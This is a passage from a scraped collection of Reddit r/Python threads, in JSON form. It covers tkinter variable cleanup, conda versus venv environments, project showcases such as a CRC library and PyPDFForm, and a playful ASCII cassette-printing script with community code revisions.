                    "content": "Yeah I'm not sure where exactly the garbage collector is that I'm fighting with, so you're probably right it's Tcl specific garbage collection. I have been able to pinpoint that the named Vars exist before they are instantiated, so per the init method, they don't get \"initialized\". My fix is to not \"name\" them (via keywords) and just let Tcl do whatever it wants with the names. But getting to this point of understanding has been truly a trial. I would use something different but this is what I have available at my company*. Business world is very different from personal use. Upgrading to the newest Python version (and moving to PyQt) is on the list but it's a few goals down the list from implementing more urgent items. Reusing tkinter Vars would be difficult for me to implement considering the way I have the whole thing set up. The dictionaries holding the variables are completely reinitialized on each refresh, so the link to the prior variables and widgets is broken. You can't change the master of a Var or widget once it's been set (known tkinter issue*). I've considered making the Var master the root instead, but I'm not sure if that fixes my general issue of using these Vars. Items added in edit to clarify my issues."
                }
            ]
        },
        {
            "author": "char101",
            "score": "4",
            "content": "If tk is threaded, the unset command is executed via the event loop. You might try emptying the event loop until the variable is removed while root.tk.getboolean(root.tk.call('info', 'exists', name)): root.update() Another option is to use a factory method (with cache) to create the variables so __del__ is not called.",
            "replies": [
                {
                    "author": "ranemaeker",
                    "score": "1",
                    "content": "I planned to run that loop today to see how long it's taking to \"unset\" the variables. If it's not too long I may revise how I plan to implement this using names, but I think using the default naming is the way to go. The purpose of this post is to counter all the How To articles that pop up showing how to use Tkinter Vars with the \"name\" key enabled. Yeah. Don't do that. No name key. Name key is for access only."
                },
                {
                    "author": "ranemaeker",
                    "score": "1",
                    "content": "...So it turns out this is an infinite loop! The variables are not ever being cleaned up in Tcl. Waited a while and then changed it to just count the number of variables in Tcl, then I printed the count on each refresh button click and app change.... The count just kept increasing during a window instance. I'm going to see about not using a variable master naming the variables and reusing the variable names with an \"exists\" call prior to instantiation Using distinct names for variables within an app instance (or if I have a log file to read and one to write, have those be two different names). So for example: proposedvarname = self._name + '_var\" if self.tk.getboolean( self.tk.call('info', 'exists', proposedvarname): self.setvar(proposedvarname, new_value) proposedvar = (not sure what to put here yet) else: proposedvar = tk.Variable( name = proposedvarname, value = new_value)"
                },
                {
                    "author": "ranemaeker",
                    "score": "1",
                    "content": "Wanted to let you know I found the solution. I had the variable set as an attribute in the widget. I did not think this was relevant information (actually I had forgotten about it completely). Using the traditional child deletion loop, I just had to add a line to pop the \"variable\" key from the child widget dict before destroying the child widget. This was a simple change and completely fixes all erratic Var behavior. for child in master.winfo_children(): child.__dict__.pop(\"variable\", None) child.destroy() Apologies in advance if the formatting is wonky, I am on mobile."
                }
            ]
        }
    ]
},
{
    "post_author": "ixatrap",
    "post_id": "1cckeip",
    "post_score": "63",
    "post_time": "Thursday, April 25, 2024 at 8:50:09 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python Interview Cheat Sheet Website!",
    "media": [
        "https://hlop3z.github.io/interviews-python/"
    ],
    "post_content": "Hey everyone,\nI’ve recently launched a new website aimed at helping fellow programmers ace their Python interviews. It’s not just limited to Python though; it also covers essential topics like big-O notation, object-oriented programming, design patterns, and more!\nI’d love to hear your thoughts and feedback on the content, layout, and anything else you think could be improved.\nCheck it out here https://hlop3z.github.io/interviews-python/ and let me know what you think. Your input is invaluable in making this resource the best it can be. Thanks in advance for your time and insights! 🚀🐍\nNote: It’s mainly to be used in a computer or tablet. You can see it in your mobile, but some sections won’t look as intended.",
    "comments": [
        {
            "author": "404ok200",
            "score": "2",
            "content": "I will definitely check these out and come back here. Looking for a switch and came across this at the perfect time.",
            "replies": [
                {
                    "author": "DrinkMoreCodeMore",
                    "score": "2",
                    "content": "Yes yes come to the python dark side and join us."
                }
            ]
        },
        {
            "author": "zerothepyro",
            "score": "2",
            "content": "I think you have these definitions reversed in your graph-search section. You have: Depth-First Explores all neighbor nodes at the present depth prior to moving on to nodes at the next depth level. Breadth-First Traverses as far as possible along each branch before backtracking.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thank you! 🙏 I fixed it!"
                }
            ]
        },
        {
            "author": "alessiocelentano",
            "score": "2",
            "content": "I was just about to create something like that. Well done!",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "You can help improve this one if you like, but if not you should give it a go creating your own. I think the more resources are out there, the better for everyone, both new and experienced, I get inspiration from people creating and sharing their knowledge."
                }
            ]
        },
        {
            "author": "MrMrsPotts",
            "score": "2",
            "content": "The complexity definitions are largely wrong I am afraid. Big Oh doesn't mean what you say it means.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thanks! I believe is fixed",
                    "replies": [
                        {
                            "author": "MrMrsPotts",
                            "score": "1",
                            "content": "It's much better now."
                        }
                    ]
                }
            ]
        },
        {
            "author": "IXISIXI",
            "score": "2",
            "content": "Nice work! It looks great, though I personally do not think this would be helpful to me in an interview, since usually if they ask you a question about big O, it's of your own code and it would probably be obvious if you're looking something up mid-sentence.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thanks! I appreciate it, well I think it depends on the person doing the interview, one time I asked the interviewer if I could search something in Google, then proceeded to explain my answer, and he did passed me to the 3rd Round. But in case of “Big-O” (worst case scenario) 😝 haha. I’m trying to make it pretty in order to screenshot or something each section, so I can then print them and have them as a sort of a poster in my wall, that way I always have access to them, even offline."
                }
            ]
        },
        {
            "author": "m3lodicdata",
            "score": "1",
            "content": "Oh boy the part on Data Structures will be so usefull for training and learning the best practices. Thank you for making this available to us free of charge 🙏",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "2",
                    "content": "You very welcome, I try to create stuff that are useful for myself and others, and also give back to the developers community"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Are you associated with this business? It seems like half your comments on reddit are in reference to this website.",
            "replies": [
                {
                    "author": "IlliterateJedi",
                    "score": "3",
                    "content": "Are you associated with this business? It seems like half your comments on reddit are in reference to this website."
                },
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Nice, Do you know their pricing? If you don’t mind paying for resources, I bought this IPhone App is just like 3 dollars, but I really liked the animations, it helped me understand more about the algorithms in a visual way https://apps.apple.com/us/app/algorithms-explained-animated/id1047532631"
                }
            ]
        }
    ]
},
{
    "post_author": "RareRandomRedditor",
    "post_id": "1caflkr",
    "post_score": "130",
    "post_time": "Monday, April 22, 2024 at 7:44:25 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "I now know again why I stopped using mamba / conda for setting up virtual environments",
    "media": [],
    "post_content": "I have started at a new job and had the idea that it would probably be clever to set up my developing environment in exactly the same way as my predecessor did. Because:\nThis should help resolving errors quicker in the transition period\nHis code was good and clean and it appears that he knows what he is doing\nwe were using mostly the same tools (VScode etc.) anyways.\nHe set up his virtual environments (VE)s with conda/mamba. I vaguely remembered that I also used to do that but then stopped for some reason and switched to the virtualenv package. But I did not remember why anymore. So I just set up my VEs in the same way, it should not really make any difference anyways (so I thought). Well, fast forward about two weeks and now I have VEs that occasionally (but not always) exist twice in the same folders under the same name (according to mamba info --envs) and that are at the same time completely empty (according to mamba list) and contain all packages I have installed anywhere, ever (according to pip list). I usually install packages via pip and I assume this may have fucked things up in combination with mamba? I'll probably switch back to virtualenv again and add a \"do not use conda/mamba VEs !!!\" in my notes. I am working on Windows. Is mamba better on Linux?",
    "comments": [
        {
            "author": "Amgadoz",
            "score": "331",
            "content": "I am a simple man with a simple recipe: Ubuntu 22.04.03 LTS cd my_project python - m venv .venv source .venv/bin/activate pip install requirements.txt This is literally the simplest way to handle virtual environments and works 99% of the time. The 1% is when you require a different python version than the default 3.10 on Ubuntu.",
            "replies": [
                {
                    "author": "sandnose",
                    "score": "71",
                    "content": "This! If your company gives you a windows computer insert step 0. Get WSL2",
                    "replies": [
                        {
                            "author": "russellvt",
                            "score": "9",
                            "content": "I lived so long under Cygwin... that was fine until Rust, and then Python modules embracing it. It does not play well with Cygwin, yet. So, indeed... WSL2 it is... Sadly, I still have much to fix in terms of basic terminal settings (largely because Windows is not like Ubuntu, or any other UNIX... haha).",
                            "replies": [
                                {
                                    "author": "susanne-o",
                                    "score": "2",
                                    "content": "which terminal problems, specifically?"
                                }
                            ]
                        },
                        {
                            "author": "tellurian_pluton",
                            "score": "-69",
                            "content": "",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "72",
                                    "content": "if your kids are like \"i'm hungry\" be like \"sorry daddy only use linux\""
                                },
                                {
                                    "author": "Ohnah-bro",
                                    "score": "12",
                                    "content": "What lmao"
                                },
                                {
                                    "author": "hassium",
                                    "score": "3",
                                    "content": "Tell me you've never worked for a large company without telling me you're never worked for a large company."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "46",
                    "content": "I did that too until I realized pyenv would help me handle multiple Python versions. Also poetry is fire."
                },
                {
                    "author": "redstej",
                    "score": "11",
                    "content": "Hi, I'm Cuda. Nice to meet you. Let me introduce you to pytorch."
                }
            ]
        },
        {
            "author": "unlikely_ending",
            "score": "27",
            "content": "Conda has always been perfectly behaved on the venv front for me I don't much care for the installation system though"
        },
        {
            "author": "IllogicalLunarBear",
            "score": "16",
            "content": "Conda is actually very useful in the life sciences as it handles many of the dependencies required. It’s like 1 or 2 commands to install Nupack4 RNA folding via conda, but it’s a mess of commands to set up without as it handles path additions and whatnot as well. It just sounds like you don’t understand the use case well."
        },
        {
            "author": "PeZet2",
            "score": "26",
            "content": "I use conda only for creating environment with a specific python version. All the packages I install I do it via pip. I never had any dificulties with environments used that way. BTW I'm not using VSCode, only team Intellij - it has better support for multiple running configurations with different parameters and some other small things that just better suits me."
        },
        {
            "author": "taciom",
            "score": "27",
            "content": "Conda used to be the go-to solution to bypass headaches while installing numpy and everything that depends on it (scipy, pandas, etc) because it installs dependencies outside the python world (blas and lapack in the numpy example). But it's much easier nowadays, I'm not sure why but I think it has to do with wheels instead of eggs. Anyway, even with conda-forge, not all packages are available through conda channels and you inevitably have to turn to pip, and then you have two non-interchangeable environment metadata holders. One thing conda/mamba still has is to easily create environment with different python versions, but even this feature has alternatives nowadays. I would write more on the subject but have to go now...",
            "replies": [
                {
                    "author": "appdnails",
                    "score": "33",
                    "content": "But it's much easier nowadays, I'm not sure why but I think it has to do with wheels instead of eggs. This problem still hasn't been solved. As far as I know, conda is still the only environment manager that can correctly deal with different versions of system libraries outside of the Python world. For instance, it is possible to install different system CUDA versions if you are working with Pytorch. I have researched A LOT about this matter, and I always see the usual \"conda is shit, just use X\", but no one ever mentions if X can actually do what conda does. The person usually thinks that conda is just a Python package and virtual environment manager, which is not true."
                }
            ]
        },
        {
            "author": "rhytnen",
            "score": "7",
            "content": "You fucked that up.  It wasnt pip.  It wad you."
        }
    ]
},
{
    "post_author": "zynix",
    "post_id": "1c82o6p",
    "post_score": "3",
    "post_time": "Friday, April 19, 2024 at 8:28:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Python desktop app using PyWebview (similar to ElectronJS) & ReactJS that tracks time.",
    "media": [
        "https://github.com/devdave/pyminder"
    ],
    "post_content": "https://github.com/devdave/pyminder\nWhat does it do?\nThe application is a very simple time tracker broken down by Client->Project->Task. In addition it has a summary report view plus a simple CRUD like data manager. The bigger goal was to see what it entailed to mix Python w/ReactJS and if it was easier using HTML+TypeScript over QT, TK, or some other unique API.\nTarget Audience\nWhile I am using PyMinder to track my own work it wasn't meant for a general audience. Instead I am sharing this in case anyone else has a need to make a desktop application and looking for alternatives.\nComparison\nI have decades of experience with HTML & Ecma script plus I have found very little benefit is gained learning yet another way to make a user interface. In addition there is more resources for HTML+JS tools and support.\nOne thing to note, if the debug console is closed, the app generally consumes only 300MB. I was expecting it to be more given the abstraction layers and behind the scenes it is an instrumented web browser instance.\nFuture sub project\n90% of the code is type annotated but that 10% is a \"here be monsters\" component that scans a Python class and makes a Typescript API-Bridge. Transformer works but it is very much hacked together with 2 unit tests that barely cover 5% of it. That said, I would like to rip that part out, clean it up, and make it its own thing as I could see some use for a Python to Typescript adapter library.",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        }
    ]
},
{
    "post_author": "cyprusgreekstudent",
    "post_id": "1cau3wk",
    "post_score": "12",
    "post_time": "Tuesday, April 23, 2024 at 6:03:04 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Pandas Python Introduction",
    "media": [
        "https://github.com/werowe/HypatiaAcademy/blob/master/pandas/Pandas_Introduction_Video.ipynb"
    ],
    "post_content": "I'm sharing some of the Python tutorials I made. I teach Ukrainian teenagers and university students Python programming and data science for free.\nHere is an introduction to Pandas.\nIt shows:\nHow to read data into a Pandas dataframe from a CSV file.\nShow how to print out the column names.\nSee and set the index.\nPrint sections of the dataframe.\nDo basic statistics.\nCreate a dataframe from a dictionary.",
    "comments": [
        {
            "author": "nbviewerbot",
            "score": "4",
            "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/werowe/HypatiaAcademy/blob/master/pandas/Pandas_Introduction_Video.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/werowe/HypatiaAcademy/master?filepath=pandas%2FPandas_Introduction_Video.ipynb I am a bot. Feedback | GitHub | Author"
        }
    ]
},
{
    "post_author": "homelesspancake",
    "post_id": "ehcyf6",
    "post_score": "1881",
    "post_time": "Monday, December 30, 2019 at 1:52:38 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a script that turns images into ASCII art",
    "media": [
        "https://i.redd.it/vjsay0l7jn741.png",
        "https://preview.redd.it/vjsay0l7jn741.png?width=640&crop=smart&auto=webp&s=e50bbd3a80b72bcd28caf8cb9e42ecb0913d96d9"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Astr0l",
            "score": "260",
            "content": "No one's going to mention the image?",
            "replies": [
                {
                    "author": "blundered_bishop",
                    "score": "98",
                    "content": "He just vibin'",
                    "replies": [
                        {
                            "author": "Yakhov",
                            "score": "34",
                            "content": "poppin a squat"
                        }
                    ]
                },
                {
                    "author": "Runtitties",
                    "score": "37",
                    "content": "Yeah, wtf"
                },
                {
                    "author": "HarissaForte",
                    "score": "11",
                    "content": "... if you're brave enough."
                },
                {
                    "author": "[deleted]",
                    "score": "1",
                    "content": "This mf is hollow."
                }
            ]
        },
        {
            "author": "SockTaters",
            "score": "113",
            "content": "Whenever compressing audio/images, it's worth looking at dithering. Say you're reducing a grey-scale photo to just black or white pixels. If there's a large area of medium-light grey, it all becomes white, losing a lot of information. Dithering solves this by calculating the difference between the white/black outcome and the original pixel and passing on that error to adjacent pixels https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering"
        },
        {
            "author": "vindard",
            "score": "12",
            "content": "Solid work OP, this is a really good start! I've never really played with PIL myself before so this was interesting to see. I did some refactoring to make this more concise. The revision history here should give a decent idea of how the code was changed. Each revision is a working version. ------------------------------- Also as a tip, there's a markdown formatting option on here that helps format any code you want to post so that it doesn't get too mangled. Example: # Import an image processing tool from PIL import Image # Decide what image to convert, and make it 1/3 the size image = Image.open(\"ctycgchr36231.jpg\") ..."
        },
        {
            "author": "Helicon_Amateur",
            "score": "11",
            "content": "Giant Dildo? Can he take it?"
        },
        {
            "author": "69shaolin69",
            "score": "5",
            "content": "How many shades of grey?"
        },
        {
            "author": "mr_poopybuthole69",
            "score": "2",
            "content": "What's the idea behind this script ?"
        },
        {
            "author": "R3ap3r_Kn1ght",
            "score": "2",
            "content": "Can I have the code? I'm impressed, it'll be fun messing around with this."
        },
        {
            "author": "RicealiciousRice",
            "score": "2",
            "content": "r/ButtSwords"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Great job!!! I’m shocked that you’re new to Python — this is so cool!"
        }
    ]
},
{
    "post_author": "marzoogy",
    "post_id": "1c9h6u6",
    "post_score": "16",
    "post_time": "Sunday, April 21, 2024 at 3:54:21 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Anycrc - Python CRC computation library",
    "media": [
        "https://github.com/madler/crcany",
        "https://github.com/Nicoretti/crc",
        "https://pypi.org/project/crcmod/",
        "https://github.com/overcat/fastcrc",
        "https://github.com/ntamas/crcmod-plus",
        "https://github.com/GardenTools/CrcEngine",
        "https://docs.python.org/3/library/binascii.html",
        "https://github.com/marzooqy/anycrc"
    ],
    "post_content": "Link: https://github.com/marzooqy/anycrc\nWhat My Project Does\nThis is a Cython module with bindings to the crcany library. It supports calculating CRC hashes of arbitary sizes as well as updating a crc hash over time, and I believe that it is the fastest generic CRC library available for Python.\nTarget Audience\nAnyone that needs to compute CRCs.\nComparison with Alternatives\ncrcmod-plus: A modernized version of the old crcmod library. It's highly customizable and fast.\nfastcrc: A library with bindings to the crc-rs library. Has a limited selection of CRCs to use.\nbinascii: The standard library module comes with support for only CRC32 and CRC-CCITT, and at least the CRC32 implementation used is pretty fast according to my testing.\nCrcEngine: If you are looking for a pure Python implementation of CRC, then this is a good option. It is however one to two orders of magnitude slower than the libraries that use C/Rust bindings.\ncrc: Popular but extremely inefficient CRC library. It does several things that severely slow it down, such as using an entire class to represent a byte. It's three orders of magnitude slower than the faster options.",
    "comments": [
        {
            "author": "NelsonMinar",
            "score": "1",
            "content": "That's an impressive collection of different CRC algorithms!",
            "replies": [
                {
                    "author": "marzoogy",
                    "score": "1",
                    "content": "Thanks! it's taken from crcany which takes it from Greg Cook: https://reveng.sourceforge.io/crc-catalogue/all.htm"
                }
            ]
        },
        {
            "author": "reveil",
            "score": "1",
            "content": "For alternatives there is also zlib.crc32 in the standard library that is supposedly faster than the binascii one: https://docs.python.org/3/library/zlib.html",
            "replies": [
                {
                    "author": "marzoogy",
                    "score": "1",
                    "content": "I believe they are both the same speed, and I believe that binascii uses zlib internally too."
                }
            ]
        }
    ]
},
{
    "post_author": "smallSohoSolo",
    "post_id": "1ca6km5",
    "post_score": "5",
    "post_time": "Monday, April 22, 2024 at 12:40:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created an AI tool for using python to process excel and other files",
    "media": [
        "https://github.com/tipisai/tipis-fe"
    ],
    "post_content": "Hi, I'm Owen, and I've developed an AI tool for data processing.\nI spend a significant amount of time processing daily data from numerous Excel files, which requires me to write a lot of Python code.\nI have been using GitHub Copilot to assist with this, but I am exploring ways to eliminate the need to write code manually.\nThe tool is called Tipis AI, and you can find it here: https://github.com/tipisai/tipis-fe\nWhat My Project Does\nTherefore, I have developed an AI that generates Python code for data processing. I've also created a Python runtime environment to execute this code.\nYou can use this tool to process any type of files.\nTarget Audience\nAny worker. Someone needs to process files.\nComparison\nYou can perform complex calculations and summarizations on files using natural language descriptions, without needing to master complex Python knowledge\nIf you have any suggestions for AI in data processing, please let me know, and I might include them in this product.I am very interested in code generation.",
    "comments": [
        {
            "author": "Prudence_trans",
            "score": "2",
            "content": "I’ll try, thanks. I mostly process xml and pdf files."
        },
        {
            "author": "FisterMister22",
            "score": "3",
            "content": "Sorry for the newbie question but the link you provided leads to typescript repo, not a python one, did I miss anything?",
            "replies": [
                {
                    "author": "tipisai",
                    "score": "1",
                    "content": "The same organization"
                }
            ]
        },
        {
            "author": "CloudFaithTTV",
            "score": "1",
            "content": "Hi I was hoping to ask a few simple questions: What libraries were you using before this? How has this improved your workflow?",
            "replies": [
                {
                    "author": "smallSohoSolo",
                    "score": "2",
                    "content": "Previously, I used pandas and requests for Excel processing, and borb for PDF handling. I also used various data computation libraries, such as numpy, and continuously debugged the code to process tasks. This was very time-consuming. Now, I let AI write the code to handle it, and I no longer need to write code for handling exceptions. The AI automatically corrects errors based on them, which is so cool"
                }
            ]
        }
    ]
},
{
    "post_author": "Most-Guarantee956",
    "post_id": "1c7r9at",
    "post_score": "11",
    "post_time": "Friday, April 19, 2024 at 10:54:41 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Import pdf into python GUI and measure length within PDF",
    "media": [],
    "post_content": "I'm interested to create a software where I can import some construction drawings and measure the distance within the PDF as a first step of my work. Tried a few open source pdf but none of them still allows me to have a correct measurement on the PDF, anyone have an idea?",
    "comments": [
        {
            "author": "MadMelvin",
            "score": "22",
            "content": "As a land surveyor, I'm gonna tell you that you really can't trust the dimensions in a vectorized PDF. Not sure what level of accuracy you need for this project, just warning you. If someone's professional reputation is going to hinge on these measurements, you really want to try to get ahold of the original file used to create the PDF."
        },
        {
            "author": "ManyInterests",
            "score": "5",
            "content": "It depends how the PDF is made. If it's an image that can be extracted and the image scale per pixel is known, I imagine it should be possible. Do you have an example PDF you could share?"
        },
        {
            "author": "Floridadew22",
            "score": "2",
            "content": "Maybe look into Bluebeam. I don’t believe they are open source but you may be able to figure out how their measuring system is so precise with some research.",
            "replies": [
                {
                    "author": "Most-Guarantee956",
                    "score": "2",
                    "content": "Yeah I'm actually using bluebeam day in day out, but wondering if I'll be able to recreate some of their basic feature for my own use."
                }
            ]
        },
        {
            "author": "JayZFeelsBad4Me",
            "score": "1",
            "content": "Share PDF sample"
        },
        {
            "author": "mon_key_house",
            "score": "1",
            "content": "Adobe reader can do this. It measures in some length unit if the pdf is provided with it i think and certainly measures in pt if not. Frpm pt you can calculate the real length."
        },
        {
            "author": "pruppert",
            "score": "1",
            "content": "The PDF Expert app just added measurement features and specifically mention its use for construction drawings. Here’s their blog post about it. You might check it out. Also, maybe Xscope could be useful?"
        },
        {
            "author": "Virtual_Pea_3577",
            "score": "1",
            "content": "Foxit pdf has a tool for that already."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c9wo8r",
    "post_score": "0",
    "post_time": "Monday, April 22, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "flobbley",
    "post_id": "9jnglb",
    "post_score": "1924",
    "post_time": "Friday, September 28, 2018 at 5:32:36 PM GMT+3",
    "flair_text": "",
    "post_title": "I'm really bored at work",
    "media": [
        "https://preview.redd.it/ggnkwkjopzo11.png?width=640&crop=smart&auto=webp&s=1118fc362de6478bbce01c37112d4af321c94d6d",
        "https://i.redd.it/ggnkwkjopzo11.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Employer: \"What skills can you bring to the company?\" OP: \"How many cassettes do you want?\" *types in '# python3 cassettes.py' and hits enter like it owes OP money* Employer: \"You're hired!\"",
            "replies": [
                {
                    "author": "SwordOfKas",
                    "score": "297",
                    "content": "Employer: \"What skills can you bring to the company?\" OP: \"How many cassettes do you want?\" *types in '# python3 cassettes.py' and hits enter like it owes OP money* Employer: \"You're hired!\"",
                    "replies": [
                        {
                            "author": "superhappyrobots",
                            "score": "54",
                            "content": "Now make one that gives us more RAM!"
                        },
                        {
                            "author": "glen_v",
                            "score": "78",
                            "content": "Employer: I want 23 cassettes. OP: But that's not square. Employer: Figure it out!!"
                        },
                        {
                            "author": "AbbasHC7",
                            "score": "7",
                            "content": "hahhahahaha"
                        },
                        {
                            "author": "mayhempk1",
                            "score": "1",
                            "content": "I laughed at this way harder than I should have."
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "CaaS",
                    "replies": [
                        {
                            "author": "dasyus",
                            "score": "2",
                            "content": "CaaS"
                        }
                    ]
                }
            ]
        },
        {
            "author": "roguemystic",
            "score": "53",
            "content": "As someone who is just getting started with learning Python this is actually quite the educational post. A working python script, a clear visual output, and a host of good comments on how to make it better! Thanks yall!"
        },
        {
            "author": "[deleted]",
            "score": "132",
            "content": "why not just if size in sizes instead of the for loop checking for each possibility and setting a flag?"
        },
        {
            "author": "Monkey_Climber",
            "score": "66",
            "content": "That looks like a solid productive day"
        },
        {
            "author": "Decker108",
            "score": "57",
            "content": "Can you genericize the code so it can take arguments for either cassettes, diskettes floppy drives, VHS tapes and SNES cartridges?"
        },
        {
            "author": "Coocos",
            "score": "28",
            "content": "Want more?"
        },
        {
            "author": "[deleted]",
            "score": "18",
            "content": "This post resonates with me on a spiritual level."
        },
        {
            "author": "Mr_Education",
            "score": "15",
            "content": "I want more."
        },
        {
            "author": "flobbley",
            "score": "14",
            "content": "Now with shapes! code: cassette = [' ______________ ','|   __    __   |','|  /  \\  /  \\  |','|  \\__/  \\__/  |','|  __________  |','|_/_O______O_\\_|'] def printSquare(side): for n in range(side): for part in cassette: print(part * side) return \"\" class triangle: def __init__(self,side): self.size = side def upperleft(side): row = side for n in range(side): for part in cassette: print(part * row) row-=1 return \"\" def upperright(side): row = int(side) for a in range(0,row): for part in cassette: parts = row - a print('                ' * a,end=\"\") print(part * parts) return \"\" def bottomright(side): row = int(side) for a in range(row,0,-1): for part in cassette: parts = row+1 - a print('                ' * int(a-1),end=\"\") print(part * parts) return \"\" def bottomleft(side): row = side for n in range(0,side): for part in cassette: print(part*int(n+1)) return \"\" def printCassettes(): more = True while more: square = False while not square: size = int(input(\"how many cassettes do you want?\\n\")) sizes = [1,2**2,3**2,4**2,5**2,6**2,7**2] if size in sizes: square = True else: print('That\\'s not square!') side = int(size**0.5) print('What shape?') print('1. Rectangle') print('2. Triangle') condition = int(input())-1 if condition != 0: print('Where do you want them?') print('1. Upper Right') print('2. Upper Left') print('3. Bottom Right') print('4. Bottom left') condition = int(input()) if condition == 0: print(printSquare(side)) elif condition == 1: print(triangle.upperright(side)) elif condition == 2: print(triangle.upperleft(side)) elif condition == 3: print(triangle.bottomright(side)) elif condition == 4: print(triangle.bottomleft(side)) if condition != 0: print('Yeah I know I didn\\'t give you all of them, that\\'s what you get for asking for a triangle') print('Want more?\\n 1. Yes\\n 2. No') wantMore = int(input()) if wantMore == 2: break return \"\" print(printCassettes())"
        },
        {
            "author": "mh3f",
            "score": "16",
            "content": "Code golf is fun. 27 lines to 15. Could condense a few more lines but I've been neglecting work to do this :) from math import sqrt cassette = ('  ______________ ', ' |   __    __   |', r' |  /  \\  /  \\  |', r' |  \\__/  \\__/  |', ' |  __________  |',  r' |_/_o______o_\\_|') while True: count = int(input(\"How many cassettes do you want?\\n\")) columns = sqrt(count) if columns.is_integer(): for _ in range(0, count, int(columns)): for line in cassette: for _ in range(int(columns)): print(line, end=\"\") print() else: print(\"That's not a square!\") if input(\"Want more?  1) Yes,  2) No\\n\") == \"2\": break"
        }
    ]
},
{
    "post_author": "chinapandaman",
    "post_id": "1c7aioh",
    "post_score": "54",
    "post_time": "Thursday, April 18, 2024 at 9:23:00 PM GMT+3",
    "flair_text": "News",
    "post_title": "PyPDFForm now lets you create widgets without Acrobat",
    "media": [
        "https://chinapandaman.github.io/PyPDFForm/prepare/",
        "https://chinapandaman.github.io/PyPDFForm/simple_fill/",
        "https://www.reddit.com/r/Python/comments/1ajhdrf/pypdfform_a_python_pdf_form_library/",
        "https://www.reddit.com/r/Python/",
        "https://github.com/chinapandaman/PyPDFForm"
    ],
    "post_content": "Hello ! Earlier this year I made a post about my open source project PyPDFForm and got some really nice feedbacks from you guys.\nI have been since then continuously working on it and I'd love to share you two really cool features that were newly added to the library.\nThe first one is, like what the title says, the library finally supports creating a subset of widgets through code now. One of the previous hard dependency for PyPDFForm was that it requires a PDF template that was prepared using another tool, namely Adobe Acrobat or some web based ones like DocFly. Well now, at least for text field, checkbox, and dropdown, you can do it through plain Python code. I personally find this a huge milestone of the project and if you are interested in this new feature checkout the documentation here.\nThe second new feature, which is actually not quite new because this was how PyPDFForm worked back in its ancestral stage, is that now you can fill a PDF form \"in place\", meaning when you fill it this way, the output PDF will look like as if it's filled manually. The reason why this got removed was because of a bug related to text field, where when filled this way the text that got put into a text field will not show up unless the text field is actually clicked by mouse and selected. Fortunately I was enlightened by another user from this sub last time I posted here and he/she gave me a solution on this weird text field bug. Thanks to that, I was able to bring this old but yet new feature back to the library for those who just wants to simply fill a PDF form. Again if you are interested, it's documented here.\nIf you are interested in any of these new features or just the library in general, feel free to go checkout the newest release of the project, try it, test it, and leave comments or suggestions. And of course if you are willing, a star on GitHub is always kindly appreciated.",
    "comments": [
        {
            "author": "zougloub",
            "score": "1",
            "content": "Wow, this sounds very familiar to what I've done in https://gitlab.com/mapletax/formfiller/ ! I'll take a look!"
        }
    ]
},
{
    "post_author": "GolemSM",
    "post_id": "1ca7do7",
    "post_score": "3",
    "post_time": "Monday, April 22, 2024 at 1:33:26 PM GMT+3",
    "flair_text": "News",
    "post_title": "Ray on Golem MVP Launch: the Best Way of Running Python Code on the Golem Network",
    "media": [
        "https://www.golem.network/ray",
        "https://blog.golem.network/announcing-ray-on-golem-mvp-launch-the-recommended-way-of-running-python-code-on-the-golem-network/"
    ],
    "post_content": "Golem Network has just released Ray on Golem MVP, a significant milestone in integrating Ray with Golem's decentralized infrastructure! 🎉\nCheck out all the details about the release and next steps in our blog post:\n📝 https://blog.golem.network/announcing-ray-on-golem-mvp-launch-the-recommended-way-of-running-python-code-on-the-golem-network/\n👉 Golem is looking for engaged beta testers to run diverse applications and collaborate on refining the solution. Interested? Find all the information on the brand-new Ray on Golem site:\n🔗 https://www.golem.network/ray",
    "comments": []
},
{
    "post_author": "TheRealMrMatt",
    "post_id": "1cb8kfa",
    "post_score": "1",
    "post_time": "Tuesday, April 23, 2024 at 7:11:43 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Inline templating engine",
    "media": [
        "https://hono.dev/guides/jsx",
        "https://github.com/a-h/templ"
    ],
    "post_content": "I was wondering if anyone has come across anything like https://github.com/a-h/templ or https://hono.dev/guides/jsx, but for python. For context, I am familiar with jinja2, mako, etc. but find them to be unintuitive due to the loose coupling of logic (ex: database calls) and templating (ex: generating a list from the database results). Therefore, I am looking for a \"inline\" templating solution.",
    "comments": [
        {
            "author": "char101",
            "score": "3",
